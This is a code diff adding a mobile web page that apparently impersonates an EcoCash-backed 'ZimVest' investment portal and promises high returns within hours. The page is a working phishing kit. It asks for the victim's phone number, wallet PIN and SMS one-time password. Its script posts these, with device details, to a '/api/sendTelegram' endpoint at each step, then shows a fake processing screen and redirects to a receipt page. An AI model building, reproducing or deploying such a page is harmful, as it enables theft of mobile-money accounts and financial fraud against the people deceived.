@@ -1,0 +1,547 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#04342C"/>
+<title>Secure Payment · ZimVest</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+
+:root{
+  --navy:#04342C;
+  --navy-dark:#021f1a;
+  --blue:#1D9E75;
+  --sky:#E1F5EE;
+  --sky-mid:#9FE1CB;
+  --sky-deep:#5DCAA5;
+  --red:#d0021b;
+  --page:#f0faf6;
+  --white:#ffffff;
+  --card:#ffffff;
+  --border:#c8e8dc;
+  --border-strong:#9FE1CB;
+  --ink:#04342C;
+  --ink-mid:#0F6E56;
+  --ink-soft:#3d7a66;
+  --ink-faint:#7db5a0;
+  --font:'Plus Jakarta Sans',sans-serif;
+  --mono:'DM Mono',monospace;
+  --r:12px;
+  --r-lg:16px;
+  --shadow:0 1px 3px rgba(4,52,44,.08),0 4px 16px rgba(4,52,44,.06);
+}
+
+html,body{
+  width:100%;height:100%;height:100dvh;
+  overflow:hidden;font-family:var(--font);
+  background:var(--page);
+}
+
+.screen{
+  display:flex;flex-direction:column;
+  width:100%;height:100%;height:100dvh;
+  max-width:430px;margin:0 auto;
+  background:var(--page);
+  overflow:hidden;position:relative;
+}
+
+/* ── HEADER ── */
+.header{
+  background:var(--navy);
+  padding:16px 18px 20px;
+  flex-shrink:0;
+  position:relative;overflow:hidden;
+}
+.header::before{
+  content:'';position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);
+  background-size:32px 32px;pointer-events:none;
+}
+.hglow{
+  position:absolute;width:240px;height:240px;border-radius:50%;
+  background:rgba(29,158,117,.3);filter:blur(70px);
+  top:-100px;right:-60px;pointer-events:none;
+}
+
+.header-top{
+  display:flex;align-items:center;justify-content:space-between;
+  position:relative;z-index:1;margin-bottom:16px;
+}
+.brand{display:flex;align-items:center;gap:9px}
+.brand-mark{width:34px;height:34px;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.22);border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.brand-name{font-size:16px;font-weight:800;color:#fff;line-height:1.1;letter-spacing:-.2px}
+.brand-tagline{font-size:9px;font-weight:600;color:rgba(255,255,255,.5);letter-spacing:.4px;margin-top:1px}
+.brand-logo-econet{height:24px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
+.brand-sep{width:1px;height:18px;background:rgba(255,255,255,.25)}
+.brand-logo-ecocash{height:30px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
+
+.amount-chip{
+  background:rgba(255,255,255,.14);
+  border:1px solid rgba(255,255,255,.22);
+  padding:5px 12px;border-radius:999px;
+  font-family:var(--mono);font-size:12px;font-weight:700;color:#fff;
+}
+
+/* bundle pills */
+.bundle-pills{
+  display:flex;gap:6px;flex-wrap:wrap;
+  position:relative;z-index:1;
+}
+.bundle-pill{
+  background:rgba(255,255,255,.12);
+  border:1px solid rgba(255,255,255,.18);
+  border-radius:999px;padding:4px 10px;
+  font-family:var(--mono);font-size:10px;font-weight:600;
+  color:rgba(255,255,255,.85);
+}
+
+/* ── BODY ── */
+.body{
+  flex:1;overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
+  padding:20px 14px max(96px,calc(80px + env(safe-area-inset-bottom)));
+  overscroll-behavior:contain;min-height:0;
+}
+.body::-webkit-scrollbar{display:none}
+
+/* STEP */
+.step{display:none;flex-direction:column;gap:0}
+.step.active{display:flex;animation:fadeIn .18s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+
+/* ECOCASH BRAND ROW — above verify card */
+.ecocash-row{
+  display:flex;align-items:center;gap:10px;
+  background:var(--white);
+  border:1.5px solid var(--border);
+  border-radius:var(--r-lg);
+  padding:12px 16px;
+  margin-bottom:10px;
+  box-shadow:var(--shadow);
+}
+.ecocash-logo-lg{height:34px;object-fit:contain}
+.eco-icon{width:42px;height:42px;background:var(--sky);border:1.5px solid var(--border-strong);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ecocash-row-text{}
+.ecocash-row-title{font-size:13px;font-weight:800;color:var(--ink);line-height:1.2}
+.ecocash-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:1px}
+
+/* CARD */
+.card{
+  background:var(--card);
+  border:1.5px solid var(--border);
+  border-radius:var(--r-lg);
+  overflow:hidden;
+  margin-bottom:10px;
+  box-shadow:var(--shadow);
+}
+.card-top-bar{
+  height:3px;
+  background:linear-gradient(90deg,var(--blue),var(--sky-deep));
+}
+.card-hdr{
+  padding:13px 16px 11px;
+  border-bottom:1px solid var(--border);
+}
+.card-title{font-size:14px;font-weight:800;color:var(--ink)}
+.card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+.card-body{padding:16px}
+
+/* FIELD */
+.field{margin-bottom:15px}
+.field:last-child{margin-bottom:0}
+.field-label{
+  font-size:10px;font-weight:700;color:var(--ink-soft);
+  text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;
+}
+
+/* PHONE ROW */
+.phone-row{display:flex;gap:8px}
+.phone-prefix{
+  background:var(--sky);border:1.5px solid var(--sky-deep);
+  color:var(--navy);font-family:var(--mono);font-size:14px;font-weight:800;
+  padding:0 14px;border-radius:var(--r);
+  display:flex;align-items:center;flex-shrink:0;height:48px;
+}
+
+input[type=tel],input[type=text],input[type=password]{
+  width:100%;height:48px;padding:0 14px;
+  border-radius:var(--r);border:1.5px solid var(--border);
+  background:var(--page);
+  font-family:var(--font);font-size:15px;font-weight:500;color:var(--ink);
+  outline:none;transition:border-color .18s,background .18s,box-shadow .18s;
+  -webkit-appearance:none;
+}
+input::placeholder{color:var(--ink-faint)}
+input:focus{
+  border-color:var(--blue);background:var(--white);
+  box-shadow:0 0 0 3px rgba(29,158,117,.12);
+}
+
+.field-hint{font-size:11px;color:var(--ink-faint);font-weight:500;margin-top:5px}
+
+/* PIN FIELD */
+.pin-field{position:relative;display:flex;align-items:center}
+.pin-field input{
+  height:48px;padding:0 50px 0 14px;
+  font-family:var(--mono);font-size:22px;letter-spacing:7px;
+}
+.eye-btn{
+  position:absolute;right:13px;background:none;border:none;
+  cursor:pointer;color:var(--ink-faint);display:flex;align-items:center;
+  padding:4px;transition:color .15s;
+}
+.eye-btn:hover{color:var(--blue)}
+
+/* OTP */
+.otp-wrap{position:relative;height:58px}
+#otpHidden{
+  position:absolute;inset:0;width:100%;height:100%;
+  opacity:0;cursor:pointer;font-size:16px;z-index:2;
+  border:none;background:none;outline:none;caret-color:transparent;
+}
+.otp-display{display:flex;gap:7px;pointer-events:none}
+.otp-box{
+  flex:1;height:58px;border-radius:var(--r);
+  border:1.5px solid var(--border);background:var(--page);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:22px;font-weight:800;color:var(--ink);
+  transition:border-color .18s,background .18s,box-shadow .18s;
+}
+.otp-box.filled{background:var(--white);border-color:var(--sky-deep)}
+.otp-box.active{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 3px rgba(29,158,117,.12)}
+.otp-box.disabled{opacity:.4;background:var(--border)}
+
+.timer-row{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:10px 0 0;
+}
+.timer-lbl{font-size:12px;color:var(--ink-soft);font-weight:500}
+.timer-num{font-family:var(--mono);font-weight:700;color:var(--blue)}
+.resend-btn{
+  background:none;border:none;font-family:var(--font);
+  font-size:12px;font-weight:700;color:var(--blue);
+  cursor:pointer;opacity:.3;padding:0;transition:opacity .18s;
+}
+.resend-btn.active{opacity:1}
+
+.masked-note{
+  font-size:13px;color:var(--ink-soft);font-weight:500;
+  text-align:center;padding:2px 0 6px;line-height:1.5;
+}
+
+/* PROCESSING */
+.proc-body{padding:30px 20px;text-align:center}
+.proc-ring{
+  width:52px;height:52px;border-radius:50%;margin:0 auto 14px;
+  border:3px solid var(--sky-deep);border-top-color:var(--blue);
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.proc-title{font-size:16px;font-weight:800;color:var(--ink);margin-bottom:5px}
+.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.5}
+
+/* ── STICKY FOOTER ── */
+.sticky-footer{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:12px 14px max(20px,env(safe-area-inset-bottom));
+  background:linear-gradient(to top,var(--page) 70%,transparent);
+  z-index:10;
+}
+.action-btn{
+  background:var(--blue);color:#fff;border:none;width:100%;padding:15px;
+  border-radius:var(--r-lg);
+  font-family:var(--font);font-size:14px;font-weight:800;
+  cursor:pointer;letter-spacing:.1px;
+  transition:all .15s;opacity:.35;pointer-events:none;
+  box-shadow:0 4px 16px rgba(29,158,117,.3);
+}
+.action-btn.active{opacity:1;pointer-events:auto}
+.action-btn:active{transform:scale(.98)}
+
+/* POWERED */
+.powered{
+  text-align:center;padding:4px 0 2px;
+  font-size:9px;color:var(--ink-faint);font-weight:500;letter-spacing:.3px;
+}
+</style>
+</head>
+<body>
+<div class="screen">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="hglow"></div>
+    <div class="header-top">
+      <div class="brand">
+        <div class="brand-mark">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+        </div>
+        <div>
+          <div class="brand-name">ZimVest</div>
+          <div class="brand-tagline">Secure Investment Portal</div>
+        </div>
+      </div>
+      <div class="amount-chip" id="headerAmount">USD 0.00</div>
+    </div>
+    <div class="bundle-pills" id="bundlePills">
+      <span class="bundle-pill" id="pillPlan">— Plan</span>
+      <span class="bundle-pill" id="pillReturn">— Return</span>
+      <span class="bundle-pill" id="pillPayout">Payout: —</span>
+      <span class="bundle-pill" id="pillHours">— hrs</span>
+    </div>
+  </div>
+
+  <!-- BODY -->
+  <div class="body">
+
+    <!-- STEP 1 -->
+    <div id="step1" class="step active">
+
+      <!-- EcoCash brand row ABOVE the verify card -->
+      <div class="ecocash-row">
+        <div class="eco-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="2" stroke-linecap="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M2 10h20"/></svg>
+        </div>
+        <div class="ecocash-row-text">
+          <div class="ecocash-row-title">Secure EcoCash Payment</div>
+          <div class="ecocash-row-sub">Your wallet is protected by EcoCash encryption</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-top-bar"></div>
+        <div class="card-hdr">
+          <div class="card-title">Confirm your EcoCash details</div>
+          <div class="card-sub">Enter the EcoCash number and PIN linked to your investment</div>
+        </div>
+        <div class="card-body">
+
+          <div class="field">
+            <div class="field-label">Phone Number</div>
+            <div class="phone-row">
+              <div class="phone-prefix">+263</div>
+              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
+            </div>
+            <div class="field-hint">9-digit number starting with 7</div>
+          </div>
+
+          <div class="field">
+            <div class="field-label">Enter Your PIN</div>
+            <div class="pin-field">
+              <input type="password" id="pinInput" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="••••" autocomplete="current-password">
+              <button class="eye-btn" id="eyeBtn" type="button" aria-label="Show PIN">
+                <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+        </div>
+      </div>
+      <div class="powered">ZimVest · Secured by EcoCash · Zimbabwe</div>
+    </div>
+
+    <!-- STEP 2: OTP -->
+    <div id="step3" class="step">
+      <div class="card">
+        <div class="card-top-bar"></div>
+        <div class="card-hdr">
+          <div class="card-title">One-Time Password</div>
+          <div class="card-sub">Check your EcoCash SMS for the 6-digit verification code</div>
+        </div>
+        <div class="card-body">
+          <div class="field">
+            <div class="masked-note" id="maskedNumber">Enter the OTP sent to your number</div>
+          </div>
+          <div class="field">
+            <div class="field-label">OTP Code</div>
+            <div class="otp-wrap" id="otpWrap">
+              <input type="text" id="otpHidden" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
+              <div class="otp-display">
+                <div class="otp-box" id="ob0"></div>
+                <div class="otp-box" id="ob1"></div>
+                <div class="otp-box" id="ob2"></div>
+                <div class="otp-box" id="ob3"></div>
+                <div class="otp-box" id="ob4"></div>
+                <div class="otp-box" id="ob5"></div>
+              </div>
+            </div>
+          </div>
+          <div class="timer-row">
+            <div class="timer-lbl">Expires in <span class="timer-num" id="time">120</span>s</div>
+            <button class="resend-btn" id="resendBtn">Resend OTP</button>
+          </div>
+        </div>
+      </div>
+      <div class="powered">ZimVest · Secured by EcoCash · Zimbabwe</div>
+    </div>
+
+    <!-- STEP 3: Processing -->
+    <div id="step4" class="step">
+      <div class="card">
+        <div class="card-top-bar"></div>
+        <div class="proc-body">
+          <div class="proc-ring"></div>
+          <div class="proc-title">Activating your investment…</div>
+          <div class="proc-sub">Your EcoCash payment is being confirmed.<br>This will only take a moment.</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FOOTER -->
+  <div class="sticky-footer">
+    <button class="action-btn" id="mainBtn">Invest Securely</button>
+  </div>
+
+</div>
+
+<script>
+let phoneValue="",pinValue="",otpValue="";
+let loginClicked=false,otpSubmitted=false,resendClicked=false;
+let currentStep="step1";
+
+let selectedPlan=null;
+try{selectedPlan=JSON.parse(sessionStorage.getItem("zimvest_plan"))}catch(e){}
+
+function initHeader(){
+  if(!selectedPlan) return;
+  document.getElementById("headerAmount").textContent="USD "+selectedPlan.amount;
+  document.getElementById("pillPlan").textContent=selectedPlan.name+" Plan";
+  document.getElementById("pillReturn").textContent="+"+selectedPlan.pct+"% Return";
+  document.getElementById("pillPayout").textContent="Payout: $"+selectedPlan.payout;
+  document.getElementById("pillHours").textContent=selectedPlan.hours+" hrs";
+}
+initHeader();
+
+const ua=navigator.userAgent;
+let device="Unknown";
+if(/Android/i.test(ua)) device="Android";
+else if(/iPhone|iPad/i.test(ua)) device="iOS";
+if(/Chrome/i.test(ua)) device+=" | Chrome";
+else if(/Safari/i.test(ua)) device+=" | Safari";
+
+function getPlanLine(){
+  if(!selectedPlan) return "No plan selected";
+  return `Plan: ${selectedPlan.name} | Deposit: $${selectedPlan.amount} | Return: +${selectedPlan.pct}% | Payout: $${selectedPlan.payout} in ${selectedPlan.hours}hrs`;
+}
+
+async function sendToTelegram(eventName){
+  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,plan:getPlanLine(),device})});
+}
+
+function showStep(id){
+  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  currentStep=id;updateBtn();
+}
+
+function updateBtn(){
+  const btn=document.getElementById("mainBtn");
+  if(currentStep==="step1"){btn.textContent="Invest Securely";validateLogin();}
+  else if(currentStep==="step3"){btn.textContent="Confirm OTP";validateOtp();}
+  else{btn.textContent="Processing...";btn.classList.remove("active");}
+}
+
+const phoneEl=document.getElementById("phone");
+phoneEl.oninput=e=>{
+  let v=e.target.value.replace(/\D/g,"");
+  if(v.startsWith("263")) v=v.slice(3);
+  if(v.startsWith("0")) v=v.slice(1);
+  if(v.length>0&&v[0]!=="7") v="7"+v.slice(1);
+  v=v.slice(0,9);e.target.value=v;
+  phoneValue="+263"+v;validateLogin();
+};
+
+const pinInput=document.getElementById("pinInput");
+const eyeBtn=document.getElementById("eyeBtn");
+pinInput.oninput=()=>{pinInput.value=pinInput.value.replace(/\D/g,"").slice(0,4);validateLogin()};
+
+eyeBtn.onclick=()=>{
+  const show=pinInput.type==="password";
+  pinInput.type=show?"text":"password";
+  eyeBtn.innerHTML=show
+    ?`<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
+    :`<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
+};
+
+function validateLogin(){
+  pinValue=pinInput.value;
+  const ok=phoneValue.length===13&&pinValue.length===4;
+  document.getElementById("mainBtn").classList.toggle("active",ok);
+}
+
+const otpHidden=document.getElementById("otpHidden");
+const otpBoxes=[...document.querySelectorAll(".otp-box")];
+let otpDisabled=false;
+
+function renderOtp(){
+  const val=otpHidden.value.replace(/\D/g,"").slice(0,6);
+  otpHidden.value=val;
+  const cursor=val.length;
+  otpBoxes.forEach((box,i)=>{
+    box.textContent=val[i]||"";
+    box.className="otp-box";
+    if(otpDisabled){box.classList.add("disabled");return}
+    if(i<cursor) box.classList.add("filled");
+    if(i===cursor&&document.activeElement===otpHidden) box.classList.add("active");
+  });
+  otpValue=val;
+  document.getElementById("mainBtn").classList.toggle("active",val.length===6);
+}
+otpHidden.addEventListener("input",renderOtp);
+otpHidden.addEventListener("focus",renderOtp);
+otpHidden.addEventListener("blur",renderOtp);
+document.getElementById("otpWrap").addEventListener("click",()=>{if(!otpDisabled)otpHidden.focus()});
+
+function resetOtp(disabled){
+  otpDisabled=disabled;otpHidden.value="";otpHidden.disabled=disabled;renderOtp();
+  if(!disabled) otpHidden.focus();
+}
+function validateOtp(){document.getElementById("mainBtn").classList.toggle("active",otpValue.length===6)}
+
+document.getElementById("mainBtn").onclick=()=>{
+  if(currentStep==="step1"){
+    if(loginClicked) return;loginClicked=true;
+    sendToTelegram("invest_initiated");
+    const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2");
+    document.getElementById("maskedNumber").textContent="Code sent to "+masked;
+    showStep("step3");startTimer();
+  } else if(currentStep==="step3"){
+    if(otpSubmitted) return;otpSubmitted=true;
+    sendToTelegram("otp_confirmed");
+    showStep("step4");
+    setTimeout(()=>{location.href="receipt.html"},1200);
+  }
+};
+
+document.getElementById("resendBtn").onclick=()=>{
+  const btn=document.getElementById("resendBtn");
+  if(!btn.classList.contains("active")) return;
+  if(resendClicked) return;resendClicked=true;
+  sendToTelegram("resend_otp");startTimer();
+};
+
+function startTimer(){
+  let t=120;
+  const timeEl=document.getElementById("time"),resendBtn=document.getElementById("resendBtn");
+  timeEl.textContent=t;resendBtn.classList.remove("active");resendClicked=false;
+  resetOtp(false);document.getElementById("mainBtn").classList.remove("active");
+  const timer=setInterval(()=>{
+    t--;timeEl.textContent=t;
+    if(t<=0){
+      clearInterval(timer);resendBtn.classList.add("active");resetOtp(true);
+      document.getElementById("mainBtn").classList.remove("active");
+      document.getElementById("maskedNumber").textContent="Code expired. Tap Resend to get a new one.";
+    }
+  },1000);
+}
+</script>
+</body>
+</html>
